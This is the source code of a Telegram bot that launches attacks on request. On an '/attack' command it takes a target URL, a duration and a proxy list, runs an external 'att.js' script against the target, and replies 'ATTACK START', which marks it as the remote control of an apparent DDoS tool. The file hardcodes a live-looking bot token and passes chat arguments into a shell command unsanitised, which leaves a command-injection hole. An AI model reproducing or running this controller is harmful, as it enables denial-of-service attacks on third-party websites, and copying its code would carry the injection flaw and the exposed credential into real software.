const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');

const token = '6744405305:AAF90-JFshRtQE31ry_TzWvA1pyeTC3PrTs';
const bot = new TelegramBot(token, { polling: true });

function isValidURL(url) {
    try {
        new URL(url);
        return true;
    } catch (error) {
        return false;
    }
}

bot.onText(/\/attack (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const args = match[1].split(' ');
    const target = args[0];
    const time = parseInt(args[1]);
    const numWords = args[2] || 64;
    const numChars = args[3] || 10;
    const proxyFile = args[4] || 'proxy.txt';

    if (!isValidURL(target)) {
        bot.sendMessage(chatId, 'Please provide a valid URL. Usage: /attack www.example.com 100');
        return;
    }

    if (isNaN(time) || time < 60 || time > 10000) {
        bot.sendMessage(chatId, 'Time must be between 60 and 10000');
        return;
    }

    const command = `node att.js ${target} ${time} ${numWords} ${numChars} ${proxyFile}`;

    exec(command, (error, stdout, stderr) => {
        if (error) {
            bot.sendMessage(chatId, 'Error occurred while running the attack.');
        } else {
            bot.sendMessage(chatId, '😈 ATTACK START 😈');
            setTimeout(() => {
                bot.sendMessage(chatId, 'YOU CAN NOW ATTACK ANOTHER SITE {BOT OWNER MD OMOR FARUK}');
            }, 30000);
        }
    });
});
                   
